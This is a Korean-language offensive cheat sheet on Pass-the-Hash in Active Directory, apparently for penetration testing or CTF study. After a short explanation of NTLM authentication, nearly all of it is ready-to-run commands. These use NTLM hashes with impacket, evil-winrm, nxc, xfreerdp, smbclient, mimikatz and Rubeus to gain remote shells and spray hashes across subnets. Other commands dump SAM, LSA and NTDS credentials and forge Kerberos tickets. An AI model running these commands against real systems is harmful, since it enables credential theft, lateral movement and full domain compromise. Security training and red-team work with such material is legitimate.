# 02_Pass-the-Hash

# AD 내부침투 — Pass-the-Hash (PtH)

---

## 개념

Windows의 NTLM 인증 프로토콜은 실제 패스워드 대신 NTLM 해시를 사용해 Challenge-Response 방식으로 인증한다. 클라이언트는 서버의 챌린지 값을 NTLM 해시로 서명해 응답하는데, 이 과정에서 실제 패스워드가 전송되지 않는다. PtH는 이 설계를 악용해 패스워드 없이 NTLM 해시만으로 인증하는 공격이다.

NTLM 인증을 사용하는 모든 서비스(SMB, WinRM, WMI, RDP, MSSQL 등)에 적용 가능하다. Kerberos 인증을 사용하는 서비스에는 직접 적용되지 않지만, Overpass-the-Hash(OtH)로 NTLM 해시를 Kerberos TGT로 변환해 우회할 수 있다.

해시는 `LM:NTLM` 형식으로 사용한다. LM 해시는 구버전 Windows에서 사용하며 현대 환경에서는 더미값(`aad3b435b51404eeaad3b435b51404ee`)으로 대체된다. NTLM만 사용할 때는 `:NTLM`으로 앞에 콜론을 붙인다.

---

## impacket

impacket은 SMB/WMI/RPC를 통해 원격 실행을 제공하는 Python 도구 모음이다. 각 도구마다 동작 방식과 탐지 위험도가 다르다.

psexec는 SMB를 통해 서비스를 생성하고 SYSTEM 권한의 대화형 셸을 제공한다. 가장 시끄럽고 탐지 위험이 높다. smbexec는 서비스를 생성하지만 실행 파일을 드롭하지 않아 psexec보다 낫다. wmiexec는 WMI를 사용해 서비스 생성 없이 관리자 권한 셸을 제공하며 가장 조용하다. atexec는 작업 스케줄러를 통해 단발성 명령을 실행한다.

```bash
# psexec — SYSTEM 권한, 대화형 셸 (가장 시끄러움)
impacket-psexec -hashes :<NTLM> administrator@<IP>
impacket-psexec -hashes :<NTLM> corp.local/administrator@<IP>
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM> administrator@<IP>

# 도메인 계정
impacket-psexec -hashes :<NTLM> corp.local/john@<IP>

# 로컬 계정 (도메인 없이)
impacket-psexec -hashes :<NTLM> administrator@<IP>

# wmiexec — 관리자 권한, WMI 사용 (더 조용함)
impacket-wmiexec -hashes :<NTLM> corp.local/administrator@<IP>
impacket-wmiexec -hashes :<NTLM> corp.local/administrator@<IP> "whoami"

# 출력만 받고 셸 없이
impacket-wmiexec -hashes :<NTLM> corp.local/administrator@<IP> "ipconfig /all"

# smbexec — 서비스 생성, 파일 드롭 없음
impacket-smbexec -hashes :<NTLM> corp.local/administrator@<IP>

# atexec — 작업 스케줄러로 단발 명령
impacket-atexec -hashes :<NTLM> corp.local/administrator@<IP> "whoami"

# dcomexec — DCOM 사용 (wmiexec 대안)
impacket-dcomexec -hashes :<NTLM> corp.local/administrator@<IP>

# secretsdump — 원격 SAM/NTDS 덤프
impacket-secretsdump -hashes :<NTLM> corp.local/administrator@<IP>

# smbclient — 파일 공유 접근
impacket-smbclient -hashes :<NTLM> corp.local/administrator@<IP>
```

---

## evil-winrm (WinRM — 가장 편함)

WinRM(포트 5985/5986)이 열려있고 해당 계정이 Remote Management Users 그룹이거나 로컬 관리자일 때 사용한다. 대화형 PowerShell 세션을 제공하며 파일 업로드/다운로드, 스크립트 로드 기능이 내장되어 있다.

```bash
# 기본
evil-winrm -i <IP> -u administrator -H <NTLM>

# 도메인 계정
evil-winrm -i <IP> -u john -H <NTLM> -d corp.local

# 로컬 스크립트 자동 업로드 경로 지정
evil-winrm -i <IP> -u administrator -H <NTLM> -s /opt/scripts/

# PowerShell 스크립트 메모리 로드
*Evil-WinRM* PS> menu          # 로드 가능한 스크립트 목록
*Evil-WinRM* PS> Invoke-Mimikatz
*Evil-WinRM* PS> PowerView.ps1  # 로드

# 파일 업로드/다운로드
*Evil-WinRM* PS> upload /local/path/file.exe C:\Temp\file.exe
*Evil-WinRM* PS> download C:\Temp\loot.txt /local/path/loot.txt

# HTTPS (5986)
evil-winrm -i <IP> -u administrator -H <NTLM> -S
```

---

## nxc (다수 호스트 스프레드)

nxc는 단일 해시로 전체 서브넷을 동시에 검증하는 데 유용하다. `(Pwn3d!)`가 뜨면 관리자 권한이 확인된 것이다.

```bash
# 단일 호스트 확인
nxc smb <IP> -u administrator -H <NTLM>

# 명령 실행 (-x = cmd, -X = PowerShell)
nxc smb <IP> -u administrator -H <NTLM> -x "whoami"
nxc smb <IP> -u administrator -H <NTLM> -X "Get-Process | Select-Object Name, Id"

# 전체 서브넷 스프레드 — 로컬 계정
nxc smb <서브넷>/24 -u administrator -H <NTLM> --local-auth --continue-on-success

# 도메인 계정
nxc smb <서브넷>/24 -u john -H <NTLM> --continue-on-success

# SAM 덤프 (로컬 계정 해시 획득)
nxc smb <IP> -u administrator -H <NTLM> --sam

# LSA secrets 덤프 (서비스 계정 패스워드 등)
nxc smb <IP> -u administrator -H <NTLM> --lsa

# NTDS 덤프 (DC에서)
nxc smb <DC_IP> -u administrator -H <NTLM> --ntds

# 공유 열거
nxc smb <IP> -u administrator -H <NTLM> --shares

# WinRM 확인
nxc winrm <IP> -u administrator -H <NTLM>

# RDP 확인
nxc rdp <IP> -u administrator -H <NTLM>

# MSSQL 확인
nxc mssql <IP> -u administrator -H <NTLM>
nxc mssql <IP> -u administrator -H <NTLM> -q "SELECT name FROM sys.databases"

# 로그인한 사용자 확인
nxc smb <IP> -u administrator -H <NTLM> --loggedon-users
```

---

## xfreerdp (RDP — GUI)

RDP(3389)가 열려있을 때 NTLM 해시로 GUI 세션을 열 수 있다. 도메인 계정과 로컬 계정 모두 가능하다.

```bash
# 기본
xfreerdp /v:<IP> /u:administrator /pth:<NTLM>

# 도메인 지정
xfreerdp /v:<IP> /u:john /d:corp.local /pth:<NTLM>

# 해상도 지정
xfreerdp /v:<IP> /u:administrator /pth:<NTLM> /w:1920 /h:1080

# 클립보드, 드라이브 공유
xfreerdp /v:<IP> /u:administrator /pth:<NTLM> /clipboard /drive:share,/tmp
```

---

## smbclient (파일 공유 접근)

```bash
# 공유 목록 확인
smbclient -L //<IP> -U administrator --pw-nt-hash <NTLM>

# 특정 공유 접속
smbclient //<IP>/C$ -U administrator --pw-nt-hash <NTLM>

# 파일 다운로드
smb: \> get flag.txt
smb: \> get "Program Files\sensitive.conf"
```

---

## mimikatz (Windows에서 PtH)

```bash
# NTLM 해시로 새 프로세스 실행
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<NTLM> /run:cmd.exe
sekurlsa::pth /user:john /domain:corp.local /ntlm:<NTLM> /run:powershell.exe

# 로컬 계정
sekurlsa::pth /user:Administrator /domain:. /ntlm:<NTLM> /run:cmd.exe
```

---

## Overpass-the-Hash (NTLM -> Kerberos TGT)

NTLM 해시를 사용해 Kerberos TGT를 요청한 뒤, 이후 Kerberos 인증이 필요한 서비스에 접근하는 방식이다. NTLM이 차단된 환경이나 Kerberos만 사용하는 서비스에 접근할 때 유용하다.

```bash
# Linux — impacket-getTGT
impacket-getTGT corp.local/john -hashes :<NTLM> -dc-ip <DC_IP>
# -> john.ccache 생성

# AES 키로도 가능
impacket-getTGT corp.local/john -aesKey <AES256> -dc-ip <DC_IP>

# 환경변수 설정 후 Kerberos 인증으로 접근
export KRB5CCNAME=john.ccache
impacket-psexec -k -no-pass corp.local/john@dc.corp.local
impacket-wmiexec -k -no-pass corp.local/john@<타겟>
```

```bash
:: Windows — mimikatz
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<NTLM> /run:cmd.exe
:: 새 cmd 창에서 net use 등 네트워크 접근 시 자동으로 TGT 발급
net use \\dc.corp.local\c$
klist   # TGT 확인

:: Rubeus
.\Rubeus.exe asktgt /user:Administrator /rc4:<NTLM> /ptt
.\Rubeus.exe asktgt /user:Administrator /aes256:<AES256> /ptt /opsec
```

---

## 해시 형식 정리

```
LM:NTLM 전체 형식:
aad3b435b51404eeaad3b435b51404ee:<NTLM>

NTLM만 (LM 더미값 생략):
:<NTLM>

secretsdump 출력 형식:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM>:::
             ^RID ^LM(더미)                        ^NTLM
```

---

## 흐름

해시 획득(secretsdump / SAM 덤프 / mimikatz) → 타겟 서비스 확인(SMB/WinRM/RDP) → nxc로 서브넷 전체 스캔 → Pwn3d! 확인 → PtH로 쉘 접근 → 다음 단계 이동